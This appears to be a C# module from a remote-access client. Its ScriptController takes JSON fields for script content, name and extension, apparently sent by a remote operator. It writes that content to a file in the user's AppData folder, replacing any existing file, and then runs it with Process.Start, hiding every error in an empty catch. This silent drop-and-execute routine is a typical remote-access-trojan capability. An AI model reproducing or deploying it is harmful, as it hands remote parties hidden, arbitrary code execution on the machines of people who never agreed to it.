using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ClIENT_PC.Controller.fnc
{
    class ScriptController : ControllerBase
    {
        string racineF = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public void Script(string path, string argv2)
        {
            dynamic argvs = serializer.DeserializeObject(argv2);
            if (argvs["content"] != "" && argvs["name"] != "" && argvs["extension"] != "")
            {
                CreeScriptExe(Convert.ToString(argvs["content"]), Convert.ToString(argvs["name"]), Convert.ToString(argvs["extension"]));
            }
        }

        public void CreeScriptExe(string conteunu, string nom_script, string extension)
        {
            string chemin_dest = racineF + @"\" + nom_script + "." + extension;
            try {
                if (File.Exists(chemin_dest))
                    File.Delete(chemin_dest);
            }
            catch { }
            try
            {
                StreamWriter file = new StreamWriter(chemin_dest);
                file.Write(conteunu);
                file.Close();
                System.Diagnostics.Process.Start(chemin_dest);
            }
            catch { }
        }
    }
}
